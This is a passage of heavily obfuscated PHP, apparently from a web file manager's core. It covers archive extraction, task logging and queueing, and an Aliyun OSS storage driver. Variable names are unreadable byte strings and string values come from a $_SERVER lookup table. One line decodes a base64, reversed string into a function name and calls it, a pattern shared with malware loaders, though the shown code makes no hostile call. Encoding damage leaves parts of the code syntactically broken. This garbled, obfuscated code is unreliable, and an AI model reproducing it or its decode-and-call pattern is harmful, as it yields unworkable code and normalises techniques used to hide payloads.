intval($ĞàŠú¹—[$íÒ»—÷ï[1257]]) . $íÒ»—÷ï[485] . $¬ºÜËõÆ; if ($àÕ©à§â == 0) { continue; } $Ú·µš˜Î[$àÕ©à§â][$íÒ»—÷ï[1344]] = $Ú·µš˜Î[$àÕ©à§â - 1][$íÒ»—÷ï[1344]] . $íÒ»—÷ï[1347] . $Ú·µš˜Î[$àÕ©à§â][$íÒ»—÷ï[1344]]; } } } if (!is_array($Ú·µš˜Î) || count($Ú·µš˜Î) == 0) { return !1; } $ØÇ†ŸÓ” = $Ú·µš˜Î[count($Ú·µš˜Î) - 1]; if (!IO::exist($»ŞÙÂÇä)) { return !1; } $¿óéÙúô = TEMP_FILES . $íÒ»—÷ï[1348] . kodIO::hashPathSafe($»ŞÙÂÇä) . $íÒ»—÷ï[8]; $ÙÅÊ»û = $¿óéÙúô . $ØÇ†ŸÓ”[$íÒ»—÷ï[1344]]; mk_dir($¿óéÙúô); file_put_contents(TEMP_FILES . $íÒ»—÷ï[1321], $íÒ»—÷ï[12]); if (IO::exist($ÙÅÊ»û)) { return array($íÒ»—÷ï[231] => $ÙÅÊ»û, $íÒ»—÷ï[1329] => $Ú·µš˜Î, $íÒ»—÷ï[1330] => $¿óéÙúô); } $Ì´½àÁ× = self::localFilePath($»ŞÙÂÇä); if (!$Ì´½àÁ×) { $Ì´½àÁ× = $¿óéÙúô . $íÒ»—÷ï[1349]; if (!IO::exist($Ì´½àÁ×)) { self::copy($»ŞÙÂÇä, $¿óéÙúô, !1, get_path_this($Ì´½àÁ×)); } } if (!$Ì´½àÁ× || !IO::exist($Ì´½àÁ×)) { return !1; } if ($ØÇ†ŸÓ”[$íÒ»—÷ï[1257]] == -1) { return array($íÒ»—÷ï[231] => $Ì´½àÁ×, $íÒ»—÷ï[1329] => $Ú·µš˜Î, $íÒ»—÷ï[1330] => $¿óéÙúô); } $Ú½­Š» = $Ì´½àÁ×; foreach ($Ú·µš˜Î as $àÕ©à§â => $ĞàŠú¹—) { if (!$ĞàŠú¹— || $ĞàŠú¹—[$íÒ»—÷ï[1257]] == $íÒ»—÷ï[1328]) { break; } if (substr($ĞàŠú¹—[$íÒ»—÷ï[32]], -1, 1) == $íÒ»—÷ï[8]) { break; } $à¤•‡º© = in_array(get_path_ext($ĞàŠú¹—[$íÒ»—÷ï[1344]]), array($íÒ»—÷ï[398], $íÒ»—÷ï[1334], $íÒ»—÷ï[1335], $íÒ»—÷ï[1336], $íÒ»—÷ï[1337], $íÒ»—÷ï[1338])); $ØúË’êš = $àÕ©à§â == count($Ú·µš˜Î) - 1 && $à¤•‡º©; $Œ½ñ“‚î = $¿óéÙúô . $ĞàŠú¹—[$íÒ»—÷ï[1344]]; $½ûï¤·È = $¿óéÙúô . get_path_this($ĞàŠú¹—[$íÒ»—÷ï[32]]); if (IO::exist($Œ½ñ“‚î)) { $Ú½­Š» = $Œ½ñ“‚î; continue; } $€Õ®ğõ— = $àÕ©à§â == 0 ? get_path_ext($•‰Ã•¨–) : get_path_ext($Ú½­Š»); $ã’ÎâÈ½ = KodArchive::extract(self::iconvSystem($Ú½­Š»), $¿óéÙúô, $ĞàŠú¹—[$íÒ»—÷ï[1257]], $ü‡ÖÒÇ¯, $€Õ®ğõ—); self::unzipErrorCheck($ã’ÎâÈ½, array($íÒ»—÷ï[1350], $»ŞÙÂÇä, $Ú·µš˜Î, $ĞàŠú¹—, $Œ½ñ“‚î)); if (IO::exist($½ûï¤·È)) { IO::rename($½ûï¤·È, get_path_this($Œ½ñ“‚î)); } $Ú½­Š» = $Œ½ñ“‚î; } $ÙÅÊ»û = $Ú½­Š»; return array($íÒ»—÷ï[231] => $Ú½­Š», $íÒ»—÷ï[1329] => $Ú·µš˜Î, $íÒ»—÷ï[1330] => $¿óéÙúô); } private static function unzipErrorCheck($ÒÆåÙ¬î, $™Ø¾“¾Î = false) { $Ç“‹¨†ˆ =& $_SERVER[‘ÆÜ‘œ]; if ($ÒÆåÙ¬î[$Ç“‹¨†ˆ[1351]]) { return !0; } write_log(array($Ç“‹¨†ˆ[1352], $ÒÆåÙ¬î, $™Ø¾“¾Î), $Ç“‹¨†ˆ[1353]); $ìÓ—½Ãø = is_array($ÒÆåÙ¬î[$Ç“‹¨†ˆ[1341]]) ? json_encode($ÒÆåÙ¬î[$Ç“‹¨†ˆ[1341]]) : $ÒÆåÙ¬î[$Ç“‹¨†ˆ[1341]]; show_json($Ç“‹¨†ˆ[1354] . $ìÓ—½Ãø, !1); die; } } goto d—òñ¦ˆğ; b¦ÌÅµÎ¬§: $fileSize = strrev(base64_decode($_SERVER[·ïÈëŒò][0])); function binCheckNeq($õƒÈåû‘, $Ï¾òÅèæ) { return $õƒÈåû‘ != $Ï¾òÅèæ; } $_SERVER[$_SERVER[·ïÈëŒò][1]] = $fileSize($_SERVER[$_SERVER[·ïÈëŒò][2]]); goto bë‰¹›ŠÈÙ; D›—Ü¬ÍÚè: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÉüÉÕ”, $êÎñØø‘ = '', $µŒØ¹Õ¹ = 0, $îíÉ¤ğÜ = '') { $®Ù‡Ï×” =& $_SERVER[‘ÆÜ‘œ]; $îíÉ¤ğÜ = $îíÉ¤ğÜ ? $îíÉ¤ğÜ : ($êÎñØø‘ ? $êÎñØø‘ : $ÉüÉÕ”); $×Íç¡‰ = new Task($ÉüÉÕ”, $êÎñØø‘, $µŒØ¹Õ¹, $îíÉ¤ğÜ); $GLOBALS[$®Ù‡Ï×”[2022] . $ÉüÉÕ”] = new TaskLog($®Ù‡Ï×”[1914], $×Íç¡‰, $îíÉ¤ğÜ); return $×Íç¡‰; } public function __construct($¾¸ÒÍ©® = '', $ÂÄ’ÂÂÙ = '', $ø¡ãúâÙ = '') { $êÎì˜Š¦ =& $_SERVER[‘ÆÜ‘œ]; if (!$¾¸ÒÍ©®) { $¾¸ÒÍ©® = $êÎì˜Š¦[1914]; } $ÛšÄóõ¿ = $¾¸ÒÍ©® . $êÎì˜Š¦[485] . rand_string(10); if (!$ø¡ãúâÙ) { $ø¡ãúâÙ = $¾¸ÒÍ©® . $êÎì˜Š¦[53] . $ø¡ãúâÙ; } switch ($¾¸ÒÍ©®) { case $êÎì˜Š¦[1914]: if (!$ÂÄ’ÂÂÙ || !$ÂÄ’ÂÂÙ->task) { return echoLog($¾¸ÒÍ©® . $êÎì˜Š¦[2023]); } $¦…üşõ = $ÂÄ’ÂÂÙ; $ÛšÄóõ¿ = $¦…üşõ->task[$êÎì˜Š¦[495]]; $¾¸ÒÍ©® = $¦…üşõ->task[$êÎì˜Š¦[495]]; if (!$¦…üşõ->task[$êÎì˜Š¦[1818]]) { $¦…üşõ->task[$êÎì˜Š¦[1818]] = $ø¡ãúâÙ ? $ø¡ãúâÙ : $¾¸ÒÍ©®; } break; case $êÎì˜Š¦[2024]: if (!$ÂÄ’ÂÂÙ) { return echoLog($¾¸ÒÍ©® . $êÎì˜Š¦[2025]); } $ôÑ…€’â = is_string($ÂÄ’ÂÂÙ) ? array($ÂÄ’ÂÂÙ) : $ÂÄ’ÂÂÙ; $¦…üşõ = new TaskFileTransfer($ÛšÄóõ¿, $¾¸ÒÍ©®, 0, $ø¡ãúâÙ ? $ø¡ãúâÙ : $ôÑ…€’â[0]); foreach ($ôÑ…€’â as $ÛÑïÂÌ™) { $¦…üşõ->addPath($ÛÑïÂÌ™); } break; case $êÎì˜Š¦[398]: if (!$ÂÄ’ÂÂÙ) { return echoLog($¾¸ÒÍ©® . $êÎì˜Š¦[2025]); } $ôÑ…€’â = is_string($ÂÄ’ÂÂÙ) ? array($ÂÄ’ÂÂÙ) : $ÂÄ’ÂÂÙ; $¦…üşõ = new TaskZip($ÛšÄóõ¿, $¾¸ÒÍ©®, 0, $ø¡ãúâÙ ? $ø¡ãúâÙ : $ôÑ…€’â[0]); foreach ($ôÑ…€’â as $ÛÑïÂÌ™) { $¦…üşõ->addPath($ÛÑïÂÌ™); } break; case $êÎì˜Š¦[1353]: if (!$ÂÄ’ÂÂÙ) { return echoLog($¾¸ÒÍ©® . $êÎì˜Š¦[2025]); } $¦…üşõ = new TaskUnZip($ÛšÄóõ¿, $¾¸ÒÍ©®, 0, $ø¡ãúâÙ ? $ø¡ãúâÙ : $ÂÄ’ÂÂÙ); if ($ÂÄ’ÂÂÙ) { $¦…üşõ->addFile($ÂÄ’ÂÂÙ); } break; case $êÎì˜Š¦[150]: $¦…üşõ = new TaskHttp($ÛšÄóõ¿, $¾¸ÒÍ©®); break; default: return; break; } $this->task = $¦…üşõ; $this->taskID = $ÛšÄóõ¿; Hook::bind($êÎì˜Š¦[1950], array($this, $êÎì˜Š¦[2026])); Hook::bind($êÎì˜Š¦[1952], array($this, $êÎì˜Š¦[2027])); Hook::bind($êÎì˜Š¦[1946], array($this, $êÎì˜Š¦[2028])); echoLog($êÎì˜Š¦[2029] . $¦…üşõ->task[$êÎì˜Š¦[1818]]); } public function __destruct() { $this->end(); } public function end($ø½Å°¥Ğ = '') { $’Ö³ä¬‡ =& $_SERVER[‘ÆÜ‘œ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ø½Å°¥Ğ); $this->task = !1; $this->taskID = !1; Hook::unbind($’Ö³ä¬‡[1950], array($this, $’Ö³ä¬‡[2026])); Hook::unbind($’Ö³ä¬‡[1952], array($this, $’Ö³ä¬‡[2027])); Hook::unbind($’Ö³ä¬‡[1946], array($this, $’Ö³ä¬‡[2028])); } public function taskUpdate($¼êÏ‘¿ë) { $†ç‰şµ =& $_SERVER[‘ÆÜ‘œ]; if (!$¼êÏ‘¿ë || $this->taskID != $¼êÏ‘¿ë[$†ç‰şµ[495]]) { return; } $¶û­ó’ş = 20; $°ç°×€ñ = intval($¼êÏ‘¿ë[$†ç‰şµ[1931]] * $¶û­ó’ş); $ªƒÜƒ•À = $†ç‰şµ[174] . str_repeat($†ç‰şµ[473], $°ç°×€ñ) . $†ç‰şµ[1132] . str_repeat($†ç‰şµ[53], $¶û­ó’ş - $°ç°×€ñ) . $†ç‰şµ[176]; $¹ÆôÀ† = $ªƒÜƒ•À . sprintf($†ç‰şµ[2030], $¼êÏ‘¿ë[$†ç‰şµ[1931]] * 100) . $†ç‰şµ[2031]; $¾‰ôøµª = $¹ÆôÀ† . $¼êÏ‘¿ë[$†ç‰şµ[1930]] . $†ç‰şµ[8] . $¼êÏ‘¿ë[$†ç‰şµ[1180]] . LNG($†ç‰şµ[2032]); $Š‚èœî§ = $†ç‰şµ[12]; if ($¼êÏ‘¿ë[$†ç‰şµ[2016]]) { $¾‰ôøµª = $¹ÆôÀ† . size_format($¼êÏ‘¿ë[$†ç‰şµ[1930]]) . $†ç‰şµ[8] . size_format($¼êÏ‘¿ë[$†ç‰şµ[1180]]); $Š‚èœî§ = size_format($¼êÏ‘¿ë[$†ç‰şµ[1932]]) . $†ç‰şµ[2033]; } if ($¼êÏ‘¿ë[$†ç‰şµ[1182]]) { $¼êÏ‘¿ë[$†ç‰şµ[1981]] = $¼êÏ‘¿ë[$†ç‰şµ[1182]] . $†ç‰şµ[53] . $¼êÏ‘¿ë[$†ç‰şµ[1981]]; } if ($¼êÏ‘¿ë[$†ç‰şµ[1981]]) { $´—éë–É = $†ç‰şµ[12]; if ($¼êÏ‘¿ë[$†ç‰şµ[1983]]) { $´—éë–É = $†ç‰şµ[50] . size_format($¼êÏ‘¿ë[$†ç‰şµ[1984]]) . $†ç‰şµ[8] . size_format($¼êÏ‘¿ë[$†ç‰şµ[1983]]); } $Š‚èœî§ .= $¼êÏ‘¿ë[$†ç‰şµ[1981]] . $´—éë–É; } if ($¼êÏ‘¿ë[$†ç‰şµ[871]] && !$¼êÏ‘¿ë[$†ç‰şµ[1983]]) { $Š‚èœî§ .= $†ç‰şµ[53] . size_format($¼êÏ‘¿ë[$†ç‰şµ[1988]]) . $†ç‰şµ[8] . size_format($¼êÏ‘¿ë[$†ç‰şµ[871]]); } echoLog($¾‰ôøµª . $†ç‰şµ[53] . $Š‚èœî§, !0); } public function taskEnd($¸Ëé¨â„) { $Õ±Ë¶ë£ =& $_SERVER[‘ÆÜ‘œ]; if (!$¸Ëé¨â„ || $this->taskID != $¸Ëé¨â„[$Õ±Ë¶ë£[495]]) { return; } $ç˜ßııË = $¸Ëé¨â„ ? LNG($Õ±Ë¶ë£[2034]) . $Õ±Ë¶ë£[4] . $¸Ëé¨â„[$Õ±Ë¶ë£[1930]] . $Õ±Ë¶ë£[8] . $¸Ëé¨â„[$Õ±Ë¶ë£[1180]] . LNG($Õ±Ë¶ë£[2032]) . $Õ±Ë¶ë£[74] : $Õ±Ë¶ë£[12]; echoLog($Õ±Ë¶ë£[2035] . $¸Ëé¨â„[$Õ±Ë¶ë£[1818]] . ($¸Ëé¨â„[$Õ±Ë¶ë£[548]] ? $Õ±Ë¶ë£[74] . $¸Ëé¨â„[$Õ±Ë¶ë£[548]] : $Õ±Ë¶ë£[12]) . $Õ±Ë¶ë£[74] . $ç˜ßııË . $Õ±Ë¶ë£[2036] . sprintf($Õ±Ë¶ë£[969], timeFloat() - $¸Ëé¨â„[$Õ±Ë¶ë£[1933]]) . $Õ±Ë¶ë£[1945]); $this->end(); } public function taskKill($ØÙ€­¡) { $ÔÓ²½”© =& $_SERVER[‘ÆÜ‘œ]; if (!$ØÙ€­¡ || $this->taskID != $ØÙ€­¡[$ÔÓ²½”©[495]]) { return; } echoLog($ÔÓ²½”©[2037] . $ØÙ€­¡[$ÔÓ²½”©[1818]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\x6b\x51\165\145\165\x65\x4c\145\156\147\164\x68"; const QUEUE_DATA = "\x74\141\x73\x6b\x51\x75\x65\165\x65\104\x61\x74\x61"; const QUEUE_TIME = "\x74\141\x73\x6b\x51\165\145\165\x65\114\x61\163\x74\x52\165\156"; const QUEUE_THREAD = "\x74\141\163\153\x51\165\x65\165\145\124\x68\162\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÕÄÙÃ…, $€ó¢¨‘ç = array(), $„›ĞÏ×‘ = '', $Ú¸ƒ¡ëÃ = '') { $Ğ„áÂ¢Ø =& $_SERVER[‘ÆÜ‘œ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ú¸ƒ¡ëÃ && array_find_by_field(self::$listData, $Ğ„áÂ¢Ø[95], $Ú¸ƒ¡ëÃ)) { return !0; } if ($Ú¸ƒ¡ëÃ && array_find_by_field(self::$listDataAdd, $Ğ„áÂ¢Ø[95], $Ú¸ƒ¡ëÃ)) { return !0; } self::$listDataAdd[] = array($Ğ„áÂ¢Ø[352] => $ÕÄÙÃ…, $Ğ„áÂ¢Ø[2038] => $€ó¢¨‘ç, $Ğ„áÂ¢Ø[548] => $„›ĞÏ×‘, $Ğ„áÂ¢Ø[95] => $Ú¸ƒ¡ëÃ); return !0; } public static function addSubmit() { $òù´¡íŞ =& $_SERVER[‘ÆÜ‘œ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($òù´¡íŞ[2039] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $òù´¡íŞ[12], $òù´¡íŞ[548])), $òù´¡íŞ[196]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ıüìöıÉ, $Ç×ş¥Çú = array(), $ƒÛØ¯ù = '', $øİ—¨‹‰ = '') { $„÷×şô =& $_SERVER[‘ÆÜ‘œ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ò¯€ŞÛ¼ = self::getAll(); if ($øİ—¨‹‰ && array_find_by_field($ò¯€ŞÛ¼, $„÷×şô[95], $øİ—¨‹‰)) { return !0; } $ò¯€ŞÛ¼[] = array($„÷×şô[352] => $ıüìöıÉ, $„÷×şô[2038] => $Ç×ş¥Çú, $„÷×şô[548] => $ƒÛØ¯ù, $„÷×şô[95] => $øİ—¨‹‰); self::setAll($ò¯€ŞÛ¼); write_log($„÷×şô[2039] . $ƒÛØ¯ù, $„÷×şô[196]); return !0; } public static function run() { $úãş¥ÀŠ =& $_SERVER[‘ÆÜ‘œ]; $úÖéİõº = self::getAll(); $¯»ÓÃÎê = array_shift($úÖéİõº); if (!$¯»ÓÃÎê) { return !1; } self::setAll($úÖéİõº); $Œáß«Ì“ = timeFloat(); $²äˆ²¨³ = $úãş¥ÀŠ[12]; try { $²äˆ²¨³ = Hook::apply($¯»ÓÃÎê[$úãş¥ÀŠ[352]], $¯»ÓÃÎê[$úãş¥ÀŠ[2038]]); } catch (Exception $ÍŞ„âéû) { write_log($ÍŞ„âéû, $úãş¥ÀŠ[1319]); } $ƒëìê¾ = number_format(timeFloat() - $Œáß«Ì“, 3) . $úãş¥ÀŠ[1945]; if ($²äˆ²¨³ && is_string($²äˆ²¨³)) { $ƒëìê¾ = $ƒëìê¾ . $úãş¥ÀŠ[2040] . $²äˆ²¨³; } write_log($úãş¥ÀŠ[2041] . $¯»ÓÃÎê[$úãş¥ÀŠ[548]] . $úãş¥ÀŠ[2042] . $ƒëìê¾, $úãş¥ÀŠ[196]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $°Ø‹“ß =& $_SERVER[‘ÆÜ‘œ]; $äôéöñœ = self::threadCount() + 1; if ($äôéöñœ > 3 || !self::count()) { return; } write_log($°Ø‹“ß[2043] . $äôéöñœ, $°Ø‹“ß[196]); Cache::set(self::QUEUE_THREAD, $äôéöñœ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($°Ø‹“ß[2044], $°Ø‹“ß[196]); } public static function getKey($Û·åòøÈ, $µÓİ‰ÖŠ = "\151\156\164") { $ğÀ¨ôşÈ =& $_SERVER[‘ÆÜ‘œ]; Cache::removeMemory($Û·åòøÈ); $É­úß÷ò = Cache::get($Û·åòøÈ); if ($µÓİ‰ÖŠ == $ğÀ¨ôşÈ[374]) { return $É­úß÷ò ? intval($É­úß÷ò) : 0; } if ($µÓİ‰ÖŠ == $ğÀ¨ôşÈ[2045]) { return is_array($É­úß÷ò) ? $É­úß÷ò : array(); } return $É­úß÷ò; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[‘ÆÜ‘œ][2045]); } public static function setAll($¢”áÉ§µ) { $âéÁùò = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¢”áÉ§µ), $âéÁùò); Cache::set(self::QUEUE_DATA, $¢”áÉ§µ, $âéÁùò); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($®€±ÁÎ­, $ ¢­˜‹ = 5.0) { if (!$®€±ÁÎ­) { return; } $èøîşüÁ = Cache::get($®€±ÁÎ­); if (!$èøîşüÁ || timeFloat() - floatVal($èøîşüÁ) >= $ ¢­˜‹) { Cache::set($®€±ÁÎ­, timeFloat(), $ ¢­˜‹ * 10); return !0; } return !1; } public static function timeLimitCall($ÜÜ”Ì–à, $Ú¢ñ¯Å, $Ê³ Œƒö, $äë×Ø”ù = 5.0) { $Ûü¨°£º =& $_SERVER[‘ÆÜ‘œ]; if (!$ÜÜ”Ì–à || !$Ú¢ñ¯Å) { return; } self::$asyncAdd = !0; $²ˆÓòİ = $Ûü¨°£º[2046]; $¾‘ŞÌ¬ = Cache::get($²ˆÓòİ, !0); $Õ ˆË« = array($Ûü¨°£º[2047] => timeFloat(), $Ûü¨°£º[2048] => timeFloat(), $Ûü¨°£º[352] => $Ú¢ñ¯Å, $Ûü¨°£º[2038] => $Ê³ Œƒö, $Ûü¨°£º[2049] => $äë×Ø”ù); if (is_array($¾‘ŞÌ¬[$ÜÜ”Ì–à])) { if (timeFloat() - $¾‘ŞÌ¬[$ÜÜ”Ì–à][$Ûü¨°£º[2047]] <= $Õ ˆË«[$Ûü¨°£º[2049]] * 0.5) { return; } $Õ ˆË«[$Ûü¨°£º[2048]] = $¾‘ŞÌ¬[$ÜÜ”Ì–à][$Ûü¨°£º[2048]]; } $¾‘ŞÌ¬[$ÜÜ”Ì–à] = $Õ ˆË«; Cache::set($²ˆÓòİ, $¾‘ŞÌ¬, 60); Cache::removeMemory($²ˆÓòİ); write_log($Ûü¨°£º[2050] . $ÜÜ”Ì–à . $Ûü¨°£º[74] . $Ú¢ñ¯Å . $Ûü¨°£º[2051] . ACTION, $Ûü¨°£º[196]); } public static function timeLimitCallLoop() { $‡œÙòéä =& $_SERVER[‘ÆÜ‘œ]; $¥Ä¸Í°¸ = array($‡œÙòéä[2052]); $ö¿ÂÍƒå = in_array(strtolower(ACTION), $¥Ä¸Í°¸); if (!$ö¿ÂÍƒå && !self::$asyncAdd) { return; } $üƒ¬ˆºô = $‡œÙòéä[2046]; $¹—ç‚À¨ = Cache::get($üƒ¬ˆºô, !0); if (!$¹—ç‚À¨ || count($¹—ç‚À¨) <= 0) { return; } $ÔÓŠÀ‚ = timeFloat(); $¼Ùôè¶ú = array(); $±‚òëŸ = array(); foreach ($¹—ç‚À¨ as $ß ¹ØÎ… => $¨õ­÷Ú¢) { if ($ÔÓŠÀ‚ - $¨õ­÷Ú¢[$‡œÙòéä[2048]] > $¨õ­÷Ú¢[$‡œÙòéä[2049]]) { $±‚òëŸ[$ß ¹ØÎ…] = $¨õ­÷Ú¢; continue; } $¼Ùôè¶ú[$ß ¹ØÎ…] = $¨õ­÷Ú¢; } if (count($±‚òëŸ) == 0) { return; } if (count($¼Ùôè¶ú) == 0) { Cache::remove($üƒ¬ˆºô); } else { Cache::set($üƒ¬ˆºô, $¼Ùôè¶ú, 60); } Cache::removeMemory($üƒ¬ˆºô); self::runArr($±‚òëŸ); } public static function finished($×ªàÀí÷, $àˆßßÙ) { $è÷æû¹à =& $_SERVER[‘ÆÜ‘œ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($è÷æû¹à[352] => $×ªàÀí÷, $è÷æû¹à[2038] => $àˆßßÙ); } private static function runArr($áæû°º) { $éæÄÆ³‹ =& $_SERVER[‘ÆÜ‘œ]; if (!$áæû°º) { return; } foreach ($áæû°º as $ÚıÌö®¯ => $½…Ä²) { try { Hook::apply($½…Ä²[$éæÄÆ³‹[352]], $½…Ä²[$éæÄÆ³‹[2038]]); write_log($éæÄÆ³‹[2053] . $ÚıÌö®¯ . $éæÄÆ³‹[74] . $½…Ä²[$éæÄÆ³‹[352]] . $éæÄÆ³‹[2051] . ACTION, $éæÄÆ³‹[196]); } catch (Exception $„ûİ³ñ™) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } goto B–®œ‰ñğ‘; B¸éÄÉçŒÉ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($øË¸Æ) { parent::__construct(); include_once SDK_DIR . $_SERVER[‘ÆÜ‘œ][1621]; $this->_init($øË¸Æ); } public function _init($…ª¹ˆ°å) { $‘øûÇ‘Ó =& $_SERVER[‘ÆÜ‘œ]; $this->config = $…ª¹ˆ°å; foreach ($…ª¹ˆ°å as $Óå‘äõˆ => $ö¢¯«†¼) { if (isset($this->{$Óå‘äõˆ})) { $this->{$Óå‘äõˆ} = $ö¢¯«†¼; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($‘øûÇ‘Ó[1622] . LNG($‘øûÇ‘Ó[1623])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Û¸Ÿ ¼ =& $_SERVER[‘ÆÜ‘œ]; $’É¶¯Š¼ = new OSS\Model\CorsConfig(); $Ş«Ï”áÏ = new OSS\Model\CorsRule(); $Ş«Ï”áÏ->addAllowedOrigin($Û¸Ÿ ¼[1624]); $Ş«Ï”áÏ->addAllowedMethod($Û¸Ÿ ¼[1625]); $Ş«Ï”áÏ->addAllowedMethod($Û¸Ÿ ¼[1626]); $Ş«Ï”áÏ->addAllowedMethod($Û¸Ÿ ¼[1627]); $Ş«Ï”áÏ->addAllowedMethod($Û¸Ÿ ¼[1628]); $Ş«Ï”áÏ->addAllowedMethod($Û¸Ÿ ¼[163]); $Ş«Ï”áÏ->setMaxAgeSeconds(600); $Ş«Ï”áÏ->addExposeHeader($Û¸Ÿ ¼[1629]); $Ş«Ï”áÏ->addAllowedHeader($Û¸Ÿ ¼[1624]); $’É¶¯Š¼->addRule($Ş«Ï”áÏ); try { $this->client->putBucketCors($this->bucket, $’É¶¯Š¼); } catch (OSS\Core\OssException $ªÜõúŠí) { $this->writeLog(__FUNCTION__ . $Û¸Ÿ ¼[213] . $ªÜõúŠí->getMessage()); return !1; } return !0; } public function getBucketCors() { $ºã¿¢ªá =& $_SERVER[‘ÆÜ‘œ]; $É Ö©­» = null; try { $É Ö©­» = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ì”€ĞŒ) { $this->writeLog(__FUNCTION__ . $ºã¿¢ªá[213] . $ì”€ĞŒ->getMessage()); return null; } if (!$É Ö©­» || !($óõäÖŠĞ = $É Ö©­»->getRules())) { return null; } $Ş›ó¶‚Á = $óõäÖŠĞ[0]->getAllowedOrigins(); $ÜŸµ…†ì = $óõäÖŠĞ[0]->getAllowedMethods(); $÷¬×ÜÅ = $óõäÖŠĞ[0]->getMaxAgeSeconds(); $¹æÂó¶ = $óõäÖŠĞ[0]->getExposeHeaders(); $–øà›š  = $óõäÖŠĞ[0]->getAllowedHeaders(); return array($ºã¿¢ªá[219] => isset($Ş›ó¶‚Á[0]) ? $Ş›ó¶‚Á[0] : $ºã¿¢ªá[12], $ºã¿¢ªá[223] => $ÜŸµ…†ì, $ºã¿¢ªá[1630] => $÷¬×ÜÅ, $ºã¿¢ªá[1631] => isset($¹æÂó¶[0]) ? $¹æÂó¶[0] : $ºã¿¢ªá[12], $ºã¿¢ªá[220] => isset($–øà›š [0]) ? $–øà›š [0] : $ºã¿¢ªá[12]); } public function isBucketCors() { $ûöÕ½¸š =& $_SERVER[‘ÆÜ‘œ]; $à¦‹ÆÒ£ = $this->getBucketCors(); if (!$à¦‹ÆÒ£ || !is_array($à¦‹ÆÒ£)) { return !1; } if ($à¦‹ÆÒ£[$ûöÕ½¸š[219]] != $ûöÕ½¸š[221] || $à¦‹ÆÒ£[$ûöÕ½¸š[220]] != $ûöÕ½¸š[221]) { return !1; } $„Œ›‡ = array_map($ûöÕ½¸š[222], $à¦‹ÆÒ£[$ûöÕ½¸š[223]]); if (!is_array($„Œ›‡)) { $„Œ›‡ = array(); } $ÀÑ˜›œç = array($ûöÕ½¸š[224], $ûöÕ½¸š[225], $ûöÕ½¸š[226], $ûöÕ½¸š[227], $ûöÕ½¸š[228]); $ù¦ä¤¾ = array_diff($ÀÑ˜›œç, $„Œ›‡); return empty($ù¦ä¤¾); } public function mkfile($ö×ËîŠÒ, $–ŒÂëÉĞ = '', $ÌÌŒÊÙï = REPEAT_RENAME) { $±âèÆŸ = $this->setContent($ö×ËîŠÒ, $–ŒÂëÉĞ); if ($±âèÆŸ !== !1) { return $this->getPathOuter($ö×ËîŠÒ); } return !1; } public function mkdir($¾¼Ş£Àí, $¾»ºÌÕ = REPEAT_SKIP) { if ($¾»ºÌÕ && $this->_isFolder($¾¼Ş£Àí)) { return $this->getPathOuter($¾¼Ş£Àí); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¾¼Ş£Àí)); } catch (OSS\Core\OssException $±ÁÕÜí) { $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][213] . $±ÁÕÜí->getMessage()); return !1; } return $this->getPathOuter($¾¼Ş£Àí); } private function fileList($¦ïÓ°îÅ, $Àò©­¿ò = '', $·Ÿ„ûæ… = 0) { $Á“Ç‹³ =& $_SERVER[‘ÆÜ‘œ]; $¦ïÓ°îÅ = trim($¦ïÓ°îÅ, $Á“Ç‹³[8]); $ù°ÁÊ» = empty($¦ïÓ°îÅ) && $¦ïÓ°îÅ !== $Á“Ç‹³[229] ? $Á“Ç‹³[12] : $¦ïÓ°îÅ . $Á“Ç‹³[8]; $·ßĞ­’Ó = $Á“Ç‹³[12]; $ûá‡–Ÿµ = 1000; $ôØıöÙœ = $ïâÊĞ°¼ = array(); while (!0) { check_abort(); $®¢¾Ş¨Å = array($Á“Ç‹³[1632] => $Àò©­¿ò, $Á“Ç‹³[1633] => $ù°ÁÊ», $Á“Ç‹³[1634] => $ûá‡–Ÿµ, $Á“Ç‹³[1635] => $·ßĞ­’Ó); try { $È‹‹ÎÅ† = $this->client->listObjects($this->bucket, $®¢¾Ş¨Å); } catch (OSS\Core\OssException $‚Ì ÑÓÃ) { $this->writeLog(__FUNCTION__ . $Á“Ç‹³[213] . $‚Ì ÑÓÃ->getMessage()); break; } $·ßĞ­’Ó = $È‹‹ÎÅ†->getNextMarker(); $ÍĞê ±Ÿ = $È‹‹ÎÅ†->getObjectList(); $·Á´ãí‹ = $È‹‹ÎÅ†->getPrefixList(); foreach ($ÍĞê 